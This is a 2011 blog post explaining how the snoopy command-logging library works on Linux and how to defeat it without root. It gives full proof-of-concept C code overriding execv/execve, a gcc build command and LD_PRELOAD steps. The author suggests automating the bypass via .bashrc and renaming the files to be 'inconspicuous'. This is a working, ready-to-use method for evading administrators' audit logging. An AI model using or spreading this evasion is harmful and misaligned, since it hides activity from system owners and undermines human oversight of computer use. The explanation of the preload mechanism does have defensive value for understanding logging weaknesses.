---
title: "Bypassing snoopy logging"
date: "2011-04-15"
redirect_from: "/post/4921812115/bypassing-snoopy-logging"
categories: 
    - "Linux"
    - "snoopy"
---


<!-- Keywords: snoopy logging circumvent bypass disable exploit get around --><br /><i>snoopy v1.8.0, CentOS 5.5 64-bit x86_64 (Linux kernel 2.6.18)</i><br><br><br /><br /><p><br />I came across the snoopy logging program today, which is a way for system administrators to log every single program that is executed on a system.  While the authors promote it's use for troubleshooting purposes, some system administrators use it for logging user activity.  The snoopy authors advise against this use, because it is easily circumvented.  I couldn't find any articles on the internets on how to circumvent it, so I decided it would be fun to dive in and try to figure it out.<br /></p><br /><br /><p><br />It turned out to be fairly easy.  Let me start with how you detect if snoopy logging is enabled on a system you use.  Logged in as any user, run the command:<br /></p><br /><br /><pre>ldd &#96;which ls&#96;</pre><br /><br />On a particular system I use at work, this is how I discovered snoopy was in place.  The output on that machine looked like this:<br /><br /><pre><br />[ryan@buggy ~]# ldd `which ls`<br />        /usr/local/lib/snoopy.so (0x00002af2d1210000)<br />        librt.so.1 => /lib64/librt.so.1 (0x00002af2d1412000)<br />        libacl.so.1 => /lib64/libacl.so.1 (0x00002af2d161b000)<br />        libselinux.so.1 => /lib64/libselinux.so.1 (0x00002af2d1822000)<br />        libc.so.6 => /lib64/libc.so.6 (0x00002af2d1a3a000)<br />        libdl.so.2 => /lib64/libdl.so.2 (0x00002af2d1d91000)<br />        libpthread.so.0 => /lib64/libpthread.so.0 (0x00002af2d1f96000)<br />        /lib64/ld-linux-x86-64.so.2 (0x00002af2d0ff3000)<br />        libattr.so.1 => /lib64/libattr.so.1 (0x00002af2d21b1000)<br />        libsepol.so.1 => /lib64/libsepol.so.1 (0x00002af2d23b5000)<br /></pre><br /><br /><pre><br />[ryan@buggy ~]# tail /var/log/secure<br />Apr 13 12:03:07 buggy snoopy[19511]: [uid:544 sid:10430 tty:/dev/pts/2 cwd:/home/ryan filename:/usr/bin/ldd]: ldd /bin/ls  [uid:544 sid:10430 tty:/dev/pts/2 cwd:/home/ryan filename:/usr/bin/ldd]: ldd /bin/ls <br /></pre><br /><br />Easy to see I'm being spied on.  Let's take a look at a bit of the snoopy source to find out how they are doing it:<br><br><br /><br /><tt><b>From snoopy.c in snoopy version 1.8.0</b></tt><br /><br /><pre><br />    #if defined(RTLD_NEXT)<br />    #  define REAL_LIBC RTLD_NEXT<br />    #else<br />    #  define REAL_LIBC ((void *) -1L)<br />    #endif<br /><br />    #define FN(ptr,type,name,args)  ptr = (type (*)args)dlsym (REAL_LIBC, name)<br /><br />    int execve(const char *filename, char *const argv[], char *const envp[])<br />    {<br />            static int (*func)(const char *, char **, char **);<br /><br />            FN(func,int,"execve",(const char *, char **const, char **const));<br />            snoopy_log(filename, argv);<br /><br />            return (*func) (filename, (char**) argv, (char **) envp);<br />    }<br /><br />    int execv(const char *filename, char *const argv[]) <br />    {<br />            static int (*func)(const char *, char **);<br /><br />            FN(func,int,"execv",(const char *, char **const));<br />            snoopy_log(filename, argv);<br />    <br />            return (*func) (filename, (char **) argv);<br />    }<br /></pre><br /><br /><p><br />Now that you've seen some code, let me explain what in the world is going on.  The snoopy library is preloaded before any other libraries, giving it the opportunity to override the execv(3) and execve(3) system calls with it's own.  This means that any time a dynamically-linked program is executed, it will call the snoopy library's version of exec() or execve().  Snoopy simply logs the execution via the <tt>snoopy_log()</tt> function and then executes the next execv() or execve() in the dynamic library chain, which is most likely the libc version.<br /></p><br /><br /><p><br />Does this add overhead?  Maybe.  I noticed that in version 1.8.0 of snoopy, there is a log filtering mechanism, which seems to spawn a bash shell to call a filtering script.  While I didn't test the performance, one would think that spawning a bash shell on every execv() or execve() call would add some serious overhead on a busy machine.  If anyone tests this out, please relay the results back to me.<br /></p><br /><br><br><br /><p><br />Let's now look into disabling snoopy (without being root). We'll take advantage of the same thing that snoopy does: we can load a library ahead of all other libraries.  By creating a library that implements execv() and execve(), we can ensure that our version of those system calls will be executed before any others.  The only thing our execv() and execve() functions do is lookup the memory address of the <i><b>REAL</b></i> libc versions of execv() and execve() and call them directly, effectively bypassing snoopy altogether (even though the snoopy lib will still be loaded).  It does this by calling dlopen() to get a handle to the libc library, then obtaining a function pointer to the execv and execve symbols in that library.<br /></p><br /><br /><pre><br /><br />     BEFORE (SNOOPY ENABLED)                       AFTER (SNOOPY BYPASSED)<br /><br />   DYNAMICALLY LINKED PROGRAM                     DYNAMICALLY LINKED PROGRAM<br />       (e.g. /bin/ls)                                   (e.g. /bin/ls)<br />              |                                                |<br />              |                                                |<br />             \ /                                              \ /<br />    +----------------------+                       +-----------------------+<br />    |      snoopy.so       |                       |       bypass.so       |<br />    | execv()     execve() |                       | execv()      execve() |<br />    +---|-------------|----+                       +---|--------------|----+<br />        |             |                     +----------+              +----------+<br />    +---|-------------|----+                |                                    |<br />    |   |  libc.so    |    |                |      +-----------------------+     |<br />    |  \ /           \ /   |                |      |      snoopy.so        |     |<br />    | execv()     execve() |                |      | execv()      execve() |     |<br />    +----------------------+                |      +-----------------------+     |<br />                                            |                                    |<br />                                            +----------+              +----------+<br />                                                   +---|--------------|----+<br />                                                   |   |  libc.so     |    |<br />                                                   |  \ /            \ /   |<br />                                                   | execv()      execve() |<br />                                                   +-----------------------+<br /><br /><br />This diagram is not 100% accurate, but serves to illustrate how the chain of events occur.<br /></pre><br /><br><br><br><br /><br /><br /><p><br />BYPASS PROCEDURE<br /></p><br />1. Drop the following into a file named <tt>bypass.c</tt>:<br /></p><br /><br /><pre><br />/*<br /> * Proof of concept to bypass snoopy logging<br /> *<br /> * Many parts of the code came directly from the snoopy source itself.<br /> *<br /> * Ryan A. Chapman<br /> * Wed Apr 13 13:28:10 MDT 2011<br /> */<br /><br />#define _GNU_SOURCE<br />#include &lt;dlfcn.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;stdarg.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;syslog.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;errno.h&gt;<br /><br />#if defined(RTLD_NEXT)<br />#  define REAL_LIBC RTLD_NEXT<br />#else<br />#  define REAL_LIBC ((void *) -1L)<br />#endif<br /><br />#define FN(ptr,type,name,args)  ptr = (type (*)args)dlsym (REAL_LIBC, name)<br />#define FN_HANDLE(handle, ptr,type,name,args)  ptr = (type (*)args)dlsym (handle, name)<br /><br />int execve(const char *filename, char *const argv[], char *const envp[])<br />{<br />    Dl_info info;<br />    void *handle = dlopen("/lib64/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    if(handle == NULL)<br />        handle = dlopen("/lib/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    static int (*func)(const char *, char **, char **);<br /><br />    FN_HANDLE(handle,func,int,"execve",(const char *, char **, char **));<br />    return (*func) (filename, (char**) argv, (char **) envp);<br />}<br /><br />/* Put the libc version of execv back in place */<br />int execv(const char *filename, char *const argv[])<br />{<br />    Dl_info info;<br />    void *handle = dlopen("/lib64/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    if(handle == NULL)<br />        handle = dlopen("/lib/libc.so.6", RTLD_NOW|RTLD_LOCAL);<br />    static int (*func)(const char *, char **);<br /><br />    FN_HANDLE(handle,func,int,"execv",(const char *, char **));<br />    return (*func) (filename, (char **) argv);<br />}<br /></pre><br /><br /><p><br />2. Now compile it with:<br /></p><br /><br /><tt>gcc  -nostartfiles -shared -O3 -fomit-frame-pointer -fPIC bypass.c -obypass.so -ldl</tt><br /><br /><p><br />You'll end up with a shared library called <tt>bypass.so</tt>.<br /></p><br /><br /><p><br />3. Finally, start a bash shell with the bypass.so library loaded:<br /></p><br /><br /><tt>export LD_PRELOAD=/full/path/to/bypass.so<br />/bin/bash</tt><br /><br /><p><br />Presto!  You're commands are no longer being logged in snoppy.  If you wanted to automate it, you could put the export and bash commands at the bottom of your .bashrc<br><br />Oh, and you may want to rename it from bypass.c and bypass.so to something a little more inconspicuous.<br /></p><br /><br />Enjoy!<br /><br /><!-- Technorati Tags Start --><br /><p>Technorati Tags:<br /><a href="http://technorati.com/tag/bypass" rel="tag">bypass</a>, <a href="http://technorati.com/tag/circumvent" rel="tag">circumvent</a>, <a href="http://technorati.com/tag/disable" rel="tag">disable</a>, <a href="http://technorati.com/tag/exploit" rel="tag">exploit</a>, <a href="http://technorati.com/tag/get%20around" rel="tag">get around</a>, <a href="http://technorati.com/tag/snoopy" rel="tag">snoopy</a>, <a href="http://technorati.com/tag/snoopy%20logger" rel="tag">snoopy logger</a><br /></p><br /><!-- Technorati Tags End --><br /><div class="blogger-post-footer">&nbsp;</div>

